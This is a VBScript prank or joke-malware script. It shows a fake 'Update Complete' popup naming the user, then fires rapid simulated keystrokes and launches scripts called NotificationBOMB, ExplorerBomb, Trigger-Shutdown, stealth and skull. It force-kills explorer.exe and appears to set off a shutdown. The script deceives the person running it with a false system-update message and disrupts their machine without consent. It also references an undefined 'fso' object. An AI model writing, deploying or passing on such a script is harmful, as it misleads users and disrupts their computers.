Dim shell, WshNtwk, infoStr, Excel
on error resume next


'-----------
' Setup
Set Excel = WScript.CreateObject("Excel.Application")
Set shell = wscript.CreateObject("WScript.Shell")
set WshNtwk = wscript.createobject("wscript.network")

shell.run "StartupSetup.bat", 0
wscript.sleep 10500

infoStr = "Hello " & WshNtwk.UserName & ", your system has been updated, press okay to complete the formatted desktop experience."

' After the update pop-up is clicked, start the song: Grieg - In the Hall of the Mountain King
shell.popup infoStr, -1,"Update Complete",vbInformation+vbSystemModal

' Cleanup
Set WshNtwk = Nothing

' START
'-------------
shell.run "MountainKing-Music.vbs"
wscript.sleep 26000
shell.sendkeys " "

wscript.sleep 15000
shell.sendkeys "{PGDN}"
wscript.sleep 2000
shell.sendkeys "^t"
wscript.sleep 500
shell.sendkeys ""

wscript.sleep 10000
shell.sendkeys "{PGDN}"
wscript.sleep 8000
shell.sendkeys "{BS}"
wscript.sleep 100
shell.sendkeys "{BS}"
wscript.sleep 3000
shell.sendkeys "{BS}"
wscript.sleep 100
shell.sendkeys "{BS}"
wscript.sleep 100
shell.sendkeys "{BS}"
wscript.sleep 10000
shell.sendkeys "{PGDN}"
wscript.sleep 2000
shell.sendkeys "{PGDN}"
wscript.sleep 2400
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{ENTER}"
wscript.sleep 11000
shell.sendkeys "{PGUP}"
wscript.sleep 4500
shell.sendkeys "{PGDN}"
wscript.sleep 900
shell.sendkeys "{PGUP}"
wscript.sleep 900
shell.sendkeys "{PGDN}"
wscript.sleep 900
shell.sendkeys "{PGUP}"
wscript.sleep 900
shell.sendkeys "{PGDN}"
wscript.sleep 450
shell.sendkeys "{PGUP}"
wscript.sleep 450
shell.sendkeys "{PGDN}"
wscript.sleep 450
shell.sendkeys "{PGUP}"
wscript.sleep 450
shell.sendkeys "{PGDN}"
wscript.sleep 450
shell.sendkeys "{PGUP}"
wscript.sleep 450
shell.sendkeys "{PGDN}"
wscript.sleep 460
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGDN}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 100
shell.sendkeys "{PGUP}"
wscript.sleep 50
shell.sendkeys "{PGDN}"
wscript.sleep 50
shell.sendkeys "{PGUP}"
wscript.sleep 50
shell.sendkeys "{PGDN}"
wscript.sleep 50
shell.sendkeys "{PGUP}"
wscript.sleep 50
shell.sendkeys "{PGDN}"
wscript.sleep 50
shell.sendkeys "{PGUP}"
wscript.sleep 50
shell.sendkeys "{PGDN}"
wscript.sleep 50
shell.sendkeys "{PGUP}"
wscript.sleep 50
shell.sendkeys "{PGDN}"
wscript.sleep 50
shell.sendkeys "{PGUP}"
wscript.sleep 50
shell.sendkeys "{PGDN}"
wscript.sleep 50
shell.sendkeys "{PGUP}"
wscript.sleep 50
shell.sendkeys "{PGDN}"
wscript.sleep 50
shell.sendkeys "{PGUP}"
wscript.sleep 50
shell.sendkeys "{PGDN}"
wscript.sleep 50
shell.sendkeys "{PGUP}"
wscript.sleep 10
shell.sendkeys "{PGDN}"
shell.run "Choo-Choo.vbs"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 10
shell.sendkeys "{F11}"
wscript.sleep 100
shell.run "ShakerRunner.bat", 0
wscript.sleep 1000
shell.sendkeys "{F11}"
wscript.sleep 800
shell.sendkeys "{F11}"
wscript.sleep 500
shell.sendkeys "{F11}"
wscript.sleep 450
shell.sendkeys "{F11}"
wscript.sleep 400
shell.sendkeys "{F11}"
wscript.sleep 350
shell.sendkeys "{F11}"
wscript.sleep 300
shell.sendkeys "{F11}"
wscript.sleep 250
shell.sendkeys "{F11}"
wscript.sleep 200
shell.sendkeys "{F11}"
wscript.sleep 150
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "{F11}"
wscript.sleep 100
shell.sendkeys "(% ) (R)"
wscript.sleep 75
shell.sendkeys "(% ) (M)"
wscript.sleep 10
shell.sendkeys "{LEFT}"

shell.run "NotificationBOMB.bat", 0
shell.run "ExplorerBomb.vbs"
shell.run "Matrix.bat"
shell.run "Matrix.bat"
shell.run "error.bat"
wscript.sleep 5000
shell.run "Giraffe.bat", 0
shell.run "error.bat"
shell.run "Trigger-Shutdown.bat", 0
shell.run "error.bat"
wscript.sleep 100
shell.run "stealth.bat", 0
shell.run "Matrix.bat"
shell.run "Matrix.bat"
shell.sendkeys "(% ) (R)"
wscript.sleep 75
shell.sendkeys "(% ) (M)"
wscript.sleep 10
shell.sendkeys "{LEFT}"
wscript.sleep 1500
shell.sendkeys " "
shell.run "skull.bat"
wscript.sleep 1000
shell.sendkeys " "
shell.run "skull.bat"
wscript.sleep 1000
shell.sendkeys " "
shell.run "skullp2.bat"
wscript.sleep 1500
shell.run "taskkill /im explorer.exe -f", 0
shell.sendkeys " "
shell.run ("Giygas.bat")
shell.run ("Giygas.bat")
shell.run "skullp2.bat"
shell.run "JustForSafety.vbs"
wscript.sleep 100
shell.sendkeys "(% ) (R)"
wscript.sleep 75
shell.sendkeys "(% ) (M)"
wscript.sleep 10
shell.sendkeys "{LEFT}"
shell.run "Sweeper.vbs"
If Not fso.FileExists("Trigger-Shutdown.bat") then
shell.run "Pranked.bat", 0
End If
'-------------
' END

wscript.quit

' Original Creation Date: 1/5/2020 11:36 AM '